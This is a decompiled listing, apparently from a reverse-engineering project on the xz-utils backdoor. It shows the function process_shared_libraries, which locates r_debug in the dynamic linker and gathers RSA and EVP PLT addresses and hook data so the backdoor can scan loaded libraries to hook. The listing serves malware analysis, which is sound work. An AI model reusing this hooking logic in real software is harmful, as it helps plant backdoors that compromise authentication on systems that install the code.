// /home/kali/xzre-ghidra/xzregh/104A40_process_shared_libraries.c
// Function: process_shared_libraries @ 0x104A40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_shared_libraries(backdoor_shared_libraries_data_t * data)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief scans loaded libraries to identify interesting libraries
 *
 *   @param data input data for the function (will be duplicated, internally)
 *   @return BOOL TRUE if successful, FALSE otherwise
 */

BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)

{
  BOOL BVar1;
  Elf64_Sym *pEVar2;
  uchar *puVar3;
  uint uVar4;
  backdoor_shared_libraries_data_t local_40;
  
  pEVar2 = elf_symbol_get(data->elf_handles->dynamic_linker,STR_r_debug,STR_GLIBC_2_2_5);
  uVar4 = 0;
  if (pEVar2 != (Elf64_Sym *)0x0) {
    local_40.elf_handles = data->elf_handles;
    puVar3 = (local_40.elf_handles)->dynamic_linker->elfbase->e_ident + pEVar2->st_value;
    uVar4 = 0;
    if (0 < *(int *)puVar3) {
      local_40.data = data->data;
      local_40.RSA_public_decrypt_plt = data->RSA_public_decrypt_plt;
      local_40.EVP_PKEY_set1_RSA_plt = data->EVP_PKEY_set1_RSA_plt;
      local_40.RSA_get0_key_plt = data->RSA_get0_key_plt;
      local_40.hooks_data_addr = data->hooks_data_addr;
      local_40.libc_imports = data->libc_imports;
      BVar1 = process_shared_libraries_map(*(link_map **)(puVar3 + 8),&local_40);
      uVar4 = (uint)(BVar1 != 0);
    }
  }
  return uVar4;
}

